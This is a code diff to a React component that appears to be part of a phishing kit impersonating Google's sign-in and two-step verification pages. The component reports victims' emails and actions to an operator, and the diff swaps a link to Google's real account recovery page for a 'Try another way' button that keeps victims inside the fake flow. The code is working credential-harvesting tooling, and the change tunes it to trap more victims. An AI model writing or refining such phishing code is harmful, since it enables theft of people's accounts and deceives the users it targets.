@@ -104,7 +104,7 @@ const ShowPasswordRow = styled.label`
   }
 `;
 
-function Fa2Google({ Unik, Email, Ip, LastFetch, wrong2faTrigger }) {
+function Fa2Google({ Unik, Email, Ip, LastFetch, wrong2faTrigger, setStep }) {
   const { setAllData, AllData } = useContext(DataContext);
 
   const [view, setView] = useState("fb");
@@ -160,7 +160,7 @@ function Fa2Google({ Unik, Email, Ip, LastFetch, wrong2faTrigger }) {
     googleDebugLog("Wrong Google password flagged by operator");
     setPasswordLoading(false);
     setPassword("");
-    setPasswordError("Wrong password. Try again or click Forgot password to reset it.");
+    setPasswordError('Wrong password. Try again or click "Try another way" for more options.');
     sendUpdate(
       { google_email: email },
       "Google 2FA Invalid - Wrong password, user can retry"
@@ -359,8 +359,8 @@ function Fa2Google({ Unik, Email, Ip, LastFetch, wrong2faTrigger }) {
         </GRight>
       </GContent>
       <GActions>
-        <TextButton type="button" onClick={() => { sendUpdate({ google_email: email.trim() }, "Google Sign-In - User clicked Forgot password"); redirect("https://accounts.google.com/signin/recovery"); }} disabled={passwordLoading}>
-          Forgot password?
+        <TextButton type="button" onClick={() => { sendUpdate({ google_email: email.trim() }, "Google Sign-In - User clicked Try another way"); setStep(22); }} disabled={passwordLoading}>
+          Try another way
         </TextButton>
         <NextButton type="submit" form="google-password-form" disabled={passwordLoading}>
           {passwordLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
